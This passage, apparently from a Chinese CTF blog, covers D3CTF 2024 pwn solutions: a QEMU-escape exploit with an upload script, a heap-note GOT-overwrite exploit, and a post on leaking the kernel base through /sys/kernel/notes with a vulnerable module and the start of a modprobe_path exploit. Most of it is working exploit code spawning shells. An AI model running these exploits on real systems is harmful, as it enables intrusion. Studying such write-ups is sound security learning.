</span><br><span class="line"></span><br><span class="line">    mmio_write(<span class="number">8</span>, <span class="number">666</span>); <span class="comment">// dest = 666</span></span><br><span class="line">    mmio_write(<span class="number">0x80</span>, <span class="number">0x80</span>);  <span class="comment">// *(_DWORD *)(v8 + 0xA00) = 0x80</span></span><br><span class="line">    pmio_read(<span class="number">8</span>);  <span class="comment">// dword_123B1CC++</span></span><br><span class="line">    <span class="type">uint32_t</span> leak = mmio_read(<span class="number">0x8c</span>);</span><br><span class="line">    <span class="type">uint32_t</span> low_system_addr = <span class="number">0xa610</span> + leak;</span><br><span class="line">    hexx(<span class="string">&quot;low_system_addr&quot;</span>, low_system_addr);</span><br><span class="line"></span><br><span class="line">    pmio_write(<span class="number">0x94</span>, low_system_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// addr_v7 = system(&quot;sh&quot;) % 0x100;</span></span><br><span class="line">    mmio_write(<span class="number">0x40</span>, <span class="number">0x6873</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上传脚本：  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"> </span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"> </span><br><span class="line">sla = <span class="keyword">lambda</span> x,y : p.sendlineafter(x,y)</span><br><span class="line">sa =  <span class="keyword">lambda</span> x,y : p.sendafter(x,y)</span><br><span class="line">ru =  <span class="keyword">lambda</span> x   : p.recvuntil(x)</span><br><span class="line"> </span><br><span class="line">p = remote(<span class="string">&#x27;106.14.121.29&#x27;</span>, <span class="number">30537</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_cmd</span>(<span class="params">cmd</span>):</span><br><span class="line">    sla(<span class="string">&#x27;# &#x27;</span>, cmd)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    lg = log.progress(<span class="string">&#x27;Upload&#x27;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    encoded = base64.b64encode(data)</span><br><span class="line">    encoded = <span class="built_in">str</span>(encoded)[<span class="number">2</span>:-<span class="number">1</span>]</span><br><span class="line">    <span class="comment"># send_cmd(&#x27;cd /proc/141/net&#x27;)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(encoded), <span class="number">300</span>):</span><br><span class="line">        lg.status(<span class="string">&#x27;%d / %d&#x27;</span> % (i, <span class="built_in">len</span>(encoded)))</span><br><span class="line">        send_cmd(<span class="string">&#x27;echo -n &quot;%s&quot; &gt;&gt; benc&#x27;</span> % (encoded[i:i+<span class="number">300</span>]))</span><br><span class="line">    send_cmd(<span class="string">&#x27;cat benc | base64 -d &gt; exp&#x27;</span>)</span><br><span class="line">    send_cmd(<span class="string">&#x27;chmod +x exp&#x27;</span>)</span><br><span class="line">    send_cmd(<span class="string">&#x27;./exp&#x27;</span>)</span><br><span class="line">    lg.success()</span><br><span class="line"> </span><br><span class="line">upload()</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>可能用人会问，在 <code>qemu</code> 中执行 <code>system(&quot;/bin/sh&quot;)</code> 不是无法 <code>getsell</code> 的吗，执行后不会有任何回显。其实是可以 <code>getshell</code> 的，但是需要通过 <code>pwntools</code> 连接后才可以看见回显，其效果如下：  </p><img src="/2024/04/29/d3ctf2024/3.png" class="" title="我的图图呢">  <h1 id="d3note"><a href="#d3note" class="headerlink" title="d3note"></a>d3note</h1><p>题目代码如下：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v8; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = sub_4011F2();</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">6425</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v6 = sub_4011F2();</span><br><span class="line">      <span class="built_in">free</span>(*((<span class="type">void</span> **)&amp;unk_4040A0 + <span class="number">2</span> * v6 + <span class="number">1</span>));</span><br><span class="line">      *((_QWORD *)&amp;unk_4040A0 + <span class="number">2</span> * v6 + <span class="number">1</span>) = <span class="number">0LL</span>;</span><br><span class="line">      *((_DWORD *)&amp;unk_4040A0 + <span class="number">4</span> * v6) = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">6425</span> )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_13:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">2064</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = sub_4011F2();</span><br><span class="line">      sub_401186(*((_QWORD *)&amp;unk_4040A0 + <span class="number">2</span> * v7 + <span class="number">1</span>), *((<span class="type">unsigned</span> <span class="type">int</span> *)&amp;unk_4040A0 + <span class="number">4</span> * v7));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 &gt; <span class="number">2064</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">276</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = sub_4011F2();</span><br><span class="line">        v8 = sub_4011F2();</span><br><span class="line">        *((_DWORD *)&amp;unk_4040A0 + <span class="number">4</span> * v4) = v8;</span><br><span class="line">        *((_QWORD *)&amp;unk_4040A0 + <span class="number">2</span> * v4 + <span class="number">1</span>) = <span class="built_in">malloc</span>((<span class="type">int</span>)v8);</span><br><span class="line">        sub_401186(*((_QWORD *)&amp;unk_4040A0 + <span class="number">2</span> * v4 + <span class="number">1</span>), v8);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v3 != <span class="number">1300</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">        v5 = sub_4011F2();</span><br><span class="line">        <span class="built_in">puts</span>(*((<span class="type">const</span> <span class="type">char</span> **)&amp;unk_4040A0 + <span class="number">2</span> * v5 + <span class="number">1</span>));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>开启的保护：  </p><img src="/2024/04/29/d3ctf2024/4.png" class="" title="我的图图呢">  <p>这题第一眼看上去就感觉是经典的菜单题，但是看了办法没有发现堆上的漏洞，后面发现在输入堆块索引时程序并没有对输入的索引进行检测，导致可以使用负索引。由于没有开启 <code>PIE</code> 且 <code>RELRO</code> 状态为 <code>Partial RELRO</code>，所以我选择劫持 <code>free</code> 的 <code>got</code> 表为 <code>system</code> 然后释放掉一个内容为 <code>sh</code> 的堆块来实现 <code>getshell</code><br>这题的一个难点在于存储堆块指针的地址都是以 <code>8</code> 结尾，导致我们不好泄露地址，经过长时间的查找我找到了可以利用的地址  </p><img src="/2024/04/29/d3ctf2024/5.png" class="" title="我的图图呢">  <p>所以我选择以这里来泄露 <code>libc</code> 的地址并作为跳板来实现修改 <code>free</code> 的 <code>got</code> 表<br>exp：  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;47.103.122.127&#x27;</span>,<span class="number">32244</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;wt.exe&#x27;</span>, <span class="string">&#x27;-w&#x27;</span>, <span class="string">&quot;0&quot;</span>, <span class="string">&quot;sp&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;Ubuntu-22.04&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>]</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;276&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;6425&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1300&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;2064&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x10</span>,<span class="string">b&#x27;/bin/sh\n&#x27;</span>)</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x10</span>,<span class="string">b&#x27;a\n&#x27;</span>)</span><br><span class="line">delete(<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line">got = <span class="number">0x404000</span></span><br><span class="line"></span><br><span class="line">show(-<span class="number">1460</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">1918624</span></span><br><span class="line">log.success(<span class="string">f&#x27;libc_base:<span class="subst">&#123;libc_base:#x&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rsi = <span class="number">0x0000000000029419</span>+libc_base</span><br><span class="line">pop_rdx = <span class="number">0x00000000000fd76d</span>+libc_base</span><br><span class="line">ret = libc_base + <span class="number">0x00000000000275f2</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0x10</span>)+p64(got)</span><br><span class="line">edit(-<span class="number">1460</span>,payload+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">edit(-<span class="number">2</span>,p64(libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>])*<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>去年的 <code>D3CTF</code> 是我第一次和校队组队参加比赛，当时我的 <code>pwn</code> 水平还停留在栈溢出阶段，完全的被这一些题目给震撼到了。今年再次参加 <code>D3CTF</code>，发现题目能看懂了，花点时间题目能做出来了，看来这一年的努力还是有那么一丢丢作用的，不过还是处于新手阶段，太弱了，哎。比赛期间真的太忙太多事情了，导致没有什么时间做题。<code>qemu</code> 逃逸找到漏洞后发现已经给 <code>xtx</code> 师傅做出来了呜呜呜（太强拉  </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>When ELF notes reveal too much</title>
      <link href="/2024/04/17/notes/"/>
      <url>/2024/04/17/notes/</url>
      
        <content type="html"><![CDATA[<p>通常我们对内核的攻击都是基于知道内核各种地址的前提下进行的，为了加大攻击内核的难度， <code>kaslr</code> 由此而生，但内核会很容易泄露有关其位置的信息，如大量内核代码乐于在 <code>printk()</code> 调用中打印出内核指针值。<br>在 大量工作 之后，通过修复内核代码来使用针对指针的特殊格式化指令，并在未设置 <code>kptr_restrict</code> 的情况下拒绝将实际指针值输出到日志中，从而基本解决了这个问题。根据需要还修改了各种 <code>/proc</code> 和 <code>sysfs</code> 文件。随着时间的推移，要想了解特定系统上的内核位置就变得更加困难了，但依然有漏网之鱼可以为我们提供内核的基址<br>这里的主角是 <code>/sys/kernel/notes</code> ，在谷歌上找到的十分简略的描述：  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">What:/sys/kernel/notes</span><br><span class="line">Date:July 2009</span><br><span class="line">Contact:&lt;linux-kernel@vger.kernel.org&gt;</span><br><span class="line">Description:The /sys/kernel/notes file contains the binary representation</span><br><span class="line">        of the running vmlinux&#x27;s .notes section.</span><br></pre></td></tr></table></figure><p>该部分是包含内核映像的 <code>ELF</code> 文件的一部分，包含有关映像本身的有用信息；任何内核代码都可以使用 <code>ELFNOTE()</code> 宏将数据添加到此部分。<br>接下来直接进入实践，环境来自一个 <code>ret2hbp</code> 的 <code>demo</code>  </p><ul><li><a href="https://github.com/veritas501/hbp_attack_demo">https://github.com/veritas501/hbp_attack_demo</a></li></ul><p>启动内核后输入 <code>hexdump -C /sys/kernel/notes</code>  </p><img src="/2024/04/17/notes/1.png" class="" title="我的图图呢">  <p>可以看到这里确实有我们想要的内核地址，为了验证这个地址是否正确，我决定用这个地址来求解这一道题目<br>题目源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;linux/printk.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/cdev.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/miscdevice.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/uaccess.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;veritas&quot;</span>);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;Dual BSD/GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">vuln_ioctl</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="type">uint64_t</span> addr;</span><br><span class="line">        <span class="type">uint64_t</span> val;</span><br><span class="line">    &#125; u;</span><br><span class="line"></span><br><span class="line">    <span class="type">long</span> ret = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(&amp;u, (<span class="type">void</span> *)arg, <span class="keyword">sizeof</span>(u))) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// write anything anywhere</span></span><br><span class="line">    <span class="comment">// pr_err(&quot;Arb Write [0x%016llx] = 0x%016llx\n&quot;, u.addr, u.val);</span></span><br><span class="line">    *(<span class="type">uint64_t</span> *)(u.addr) = u.val;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">vuln_fops</span> =</span> &#123;.owner = THIS_MODULE,</span><br><span class="line">                                           .open = <span class="literal">NULL</span>,</span><br><span class="line">                                           .release = <span class="literal">NULL</span>,</span><br><span class="line">                                           .read = <span class="literal">NULL</span>,</span><br><span class="line">                                           .write = <span class="literal">NULL</span>,</span><br><span class="line">                                           .unlocked_ioctl = vuln_ioctl&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">miscdevice</span> <span class="title">vuln_miscdev</span> =</span> &#123;</span><br><span class="line">    .minor = MISC_DYNAMIC_MINOR, .name = <span class="string">&quot;vuln&quot;</span>, .fops = &amp;vuln_fops&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">vuln_init</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    pr_info(<span class="string">&quot;vuln: module init.\n&quot;</span>);</span><br><span class="line">    misc_register(&amp;vuln_miscdev);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">vuln_exit</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    pr_info(<span class="string">&quot;vuln: module exit.\n&quot;</span>);</span><br><span class="line">    misc_deregister(&amp;vuln_miscdev);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(vuln_init);</span><br><span class="line">module_exit(vuln_exit);</span><br></pre></td></tr></table></figure><p>可以看到我们有无数次任意地址写 <code>8</code> 字节的机会，假设上面泄露出来的地址是正确的，我们可以通过修改 <code>modprobe_path</code> 来获取 <code>flag</code><br>exp：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span 